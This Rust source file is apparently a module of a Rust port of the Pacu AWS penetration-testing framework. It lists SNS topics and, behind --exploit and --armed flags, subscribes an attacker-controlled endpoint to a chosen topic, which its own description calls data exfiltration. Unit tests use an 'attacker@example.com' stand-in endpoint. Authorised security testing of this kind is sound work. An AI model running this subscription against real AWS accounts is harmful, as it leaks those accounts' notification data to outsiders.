//! sns__subscribe — subscribe an attacker-controlled endpoint to SNS topics.
//!
//! Category: LATERAL_MOVE. Services: ["SNS"].
//!
//! ⚠️  Write module — requires --armed for the subscription step.
//!
//! Args:
//!   --topic-arn <arn>      SNS topic to subscribe to (required for subscribe)
//!   --protocol <proto>     subscription protocol: email, https, sqs, lambda (default: email)
//!   --endpoint <endpoint>  endpoint to receive notifications (required for subscribe)
//!   --list                 just list available SNS topics (read-only)
//!   --exploit              actually subscribe (requires --armed)
//!
//! Dry-run: show current topic subscriptions, print [DRY-RUN] intent
//! --exploit + --armed: sns:Subscribe(TopicArn, Protocol, Endpoint)

use colored::Colorize;

use crate::module::{AwsContext, Module, ModuleInfo};

const VALID_PROTOCOLS: &[&str] = &["email", "email-json", "https", "http", "sqs", "lambda", "sms", "firehose"];

// ---------------------------------------------------------------------------
// Module entry point
// ---------------------------------------------------------------------------

pub async fn run(ctx: &AwsContext, args: &[&str]) -> anyhow::Result<()> {
    // ── Parse args ─────────────────────────────────────────────────────────
    let topic_arn: Option<&str> = args
        .iter()
        .position(|&a| a == "--topic-arn")
        .and_then(|i| args.get(i + 1).copied());

    let protocol: &str = args
        .iter()
        .position(|&a| a == "--protocol")
        .and_then(|i| args.get(i + 1).copied())
        .unwrap_or("email");

    let endpoint: Option<&str> = args
        .iter()
        .position(|&a| a == "--endpoint")
        .and_then(|i| args.get(i + 1).copied());

    let list_only = args.contains(&"--list");
    let exploit = args.contains(&"--exploit");

    if exploit && !ctx.armed {
        eprintln!(
            "{}",
            "Error: --exploit requires --armed. Pass --armed when starting pacu.".red().bold()
        );
        return Ok(());
    }

    // Validate protocol if provided
    if !VALID_PROTOCOLS.contains(&protocol) {
        anyhow::bail!(
            "--protocol '{}' is not valid; choose one of: {}",
            protocol,
            VALID_PROTOCOLS.join(", ")
        );
    }

    println!("{}", "sns__subscribe".cyan().bold());
    println!(
        "  {}",
        "Subscribe an attacker-controlled endpoint to SNS topics for data exfiltration.\n".yellow()
    );

    let sns = aws_sdk_sns::Client::new(&ctx.sdk_config);

    // ── List-only mode ─────────────────────────────────────────────────────
    if list_only {
        return list_topics(&sns).await;
    }

    // ── Exploit mode: validate required args ───────────────────────────────
    if exploit {
        let topic_arn = match topic_arn {
            Some(a) => a,
            None => anyhow::bail!("--topic-arn <arn> is required in exploit mode"),
        };
        let endpoint = match endpoint {
            Some(e) => e,
            None => anyhow::bail!("--endpoint <endpoint> is required in exploit mode"),
        };
        return do_subscribe(&sns, topic_arn, protocol, endpoint).await;
    }

    // ── Dry-run mode: list topics + show what would happen ─────────────────
    println!("  {} Listing SNS topics...", "[INFO]".cyan());
    let _ = list_topics(&sns).await;

    if let Some(arn) = topic_arn {
        // Show existing subscriptions for the topic
        println!(
            "\n  {} Fetching existing subscriptions for {}...",
            "[INFO]".cyan(),
            arn.yellow()
        );
        match sns.list_subscriptions_by_topic().topic_arn(arn).send().await {
            Ok(resp) => {
                let subs = resp.subscriptions();
                if subs.is_empty() {
                    println!("  No existing subscriptions found for this topic.");
                } else {
                    println!("  {} existing subscription(s):", subs.len());
                    for sub in subs {
                        println!(
                            "    protocol={} endpoint={} status={}",
                            sub.protocol().unwrap_or("<unknown>").yellow(),
                            sub.endpoint().unwrap_or("<unknown>").cyan(),
                            sub.subscription_arn().unwrap_or("<unknown>").dimmed()
                        );
                    }
                }
            }
            Err(e) => {
                println!("  {} Could not list subscriptions: {}", "[WARN]".yellow(), e);
            }
        }

        let ep = endpoint.unwrap_or("<endpoint-not-provided>");
        println!(
            "\n  {} Would call: sns:Subscribe(TopicArn={}, Protocol={}, Endpoint={})",
            "[DRY-RUN]".cyan(),
            arn.yellow(),
            protocol.yellow(),
            ep.yellow()
        );
    } else {
        println!(
            "\n  {} Would call: sns:Subscribe on <topic_arn>",
            "[DRY-RUN]".cyan()
        );
        println!(
            "  {}",
            "Provide --topic-arn <arn> and --endpoint <endpoint> to target a specific topic.".dimmed()
        );
    }

    println!(
        "\n{}",
        "Run with --exploit --armed to actually subscribe.".yellow()
    );

    Ok(())
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

async fn list_topics(sns: &aws_sdk_sns::Client) -> anyhow::Result<()> {
    let mut topics: Vec<String> = Vec::new();
    let mut next_token: Option<String> = None;

    loop {
        let mut req = sns.list_topics();
        if let Some(ref tok) = next_token {
            req = req.next_token(tok);
        }
        match req.send().await {
            Ok(resp) => {
                for t in resp.topics() {
                    if let Some(arn) = t.topic_arn() {
                        topics.push(arn.to_owned());
                    }
                }
                next_token = resp.next_token().map(|s| s.to_owned());
                if next_token.is_none() {
                    break;
                }
            }
            Err(e) => {
                eprintln!("  {} sns:ListTopics failed: {}", "[ERR]".red().bold(), e);
                break;
            }
        }
    }

    if topics.is_empty() {
        println!("  {} No SNS topics found (or insufficient permissions).", "[INFO]".cyan());
    } else {
        println!(
            "  {} Found {} SNS topic(s):",
            "[FOUND]".green().bold(),
            topics.len()
        );
        for arn in &topics {
            println!("    {}", arn.yellow());
        }
    }

    Ok(())
}

async fn do_subscribe(
    sns: &aws_sdk_sns::Client,
    topic_arn: &str,
    protocol: &str,
    endpoint: &str,
) -> anyhow::Result<()> {
    println!(
        "  {} Calling sns:Subscribe(TopicArn={}, Protocol={}, Endpoint={})...",
        "[EXEC]".red().bold(),
        topic_arn.yellow(),
        protocol.yellow(),
        endpoint.yellow()
    );

    match sns
        .subscribe()
        .topic_arn(topic_arn)
        .protocol(protocol)
        .endpoint(endpoint)
        .send()
        .await
    {
        Ok(resp) => {
            let sub_arn = resp.subscription_arn().unwrap_or("<pending confirmation>");
            println!(
                "  {} sns:Subscribe succeeded! SubscriptionArn: {}",
                "[OK]".green().bold(),
                sub_arn.green()
            );
            if sub_arn.contains("pending") {
                println!(
                    "  {} Subscription pending confirmation — check {} for a confirmation email/request.",
                    "[INFO]".cyan(),
                    endpoint.yellow()
                );
            }
        }
        Err(e) => {
            eprintln!(
                "  {} sns:Subscribe failed: {}",
                "[ERR]".red().bold(),
                e
            );
        }
    }

    Ok(())
}

// ---------------------------------------------------------------------------
// Module registration
// ---------------------------------------------------------------------------

inventory::submit! {
    Module {
        info: ModuleInfo {
            name: "sns__subscribe",
            author: "lancer-pacu",
            category: "LATERAL_MOVE",
            one_liner: "Subscribe an attacker-controlled endpoint to SNS topics for data exfiltration. Requires --armed + --exploit.",
            services: &["SNS"],
        },
        run: |ctx, args| Box::pin(run(ctx, args)),
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
#[cfg(test)]
mod tests {
    use crate::module::Module;

    #[test]
    fn module_registered_in_inventory() {
        let found = inventory::iter::<Module>
            .into_iter()
            .any(|m| m.info.name == "sns__subscribe");
        assert!(found, "sns__subscribe not found in inventory");
    }

    #[test]
    fn module_category_is_lateral_move() {
        let m = inventory::iter::<Module>
            .into_iter()
            .find(|m| m.info.name == "sns__subscribe")
            .expect("sns__subscribe not found");
        assert_eq!(m.info.category, "LATERAL_MOVE");
    }

    #[test]
    fn module_services_include_sns() {
        let m = inventory::iter::<Module>
            .into_iter()
            .find(|m| m.info.name == "sns__subscribe")
            .expect("sns__subscribe not found");
        assert!(m.info.services.contains(&"SNS"));
    }

    #[tokio::test]
    async fn exploit_without_armed_returns_ok() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        let result = super::run(
            &ctx,
            &["--exploit", "--topic-arn", "arn:aws:sns:us-east-1:123:test", "--endpoint", "test@example.com"],
        )
        .await;
        assert!(
            result.is_ok(),
            "exploit without armed should return Ok: {:?}",
            result.err()
        );
    }

    #[tokio::test]
    async fn exploit_missing_topic_arn_errors() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: true,
            sdk_config,
            db_pool: None,
        };
        // --exploit + --armed but no --topic-arn
        let result = super::run(
            &ctx,
            &["--exploit", "--endpoint", "attacker@example.com"],
        )
        .await;
        assert!(result.is_err(), "expected error when --topic-arn is missing");
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("--topic-arn"),
            "error should mention --topic-arn: {msg}"
        );
    }

    #[tokio::test]
    async fn exploit_missing_endpoint_errors() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: true,
            sdk_config,
            db_pool: None,
        };
        // --exploit + --armed but no --endpoint
        let result = super::run(
            &ctx,
            &["--exploit", "--topic-arn", "arn:aws:sns:us-east-1:123:test"],
        )
        .await;
        assert!(result.is_err(), "expected error when --endpoint is missing");
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("--endpoint"),
            "error should mention --endpoint: {msg}"
        );
    }

    #[tokio::test]
    async fn invalid_protocol_returns_error() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        let result = super::run(&ctx, &["--protocol", "carrier-pigeon"]).await;
        assert!(result.is_err(), "expected error for invalid protocol");
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("not valid") || msg.contains("--protocol"),
            "error should describe valid protocols: {msg}"
        );
    }

    #[tokio::test]
    async fn list_mode_does_not_require_topic_arn() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        // --list is read-only and should not require --topic-arn
        // May fail due to no credentials but should not error on arg parsing
        let _ = super::run(&ctx, &["--list"]).await;
    }
}
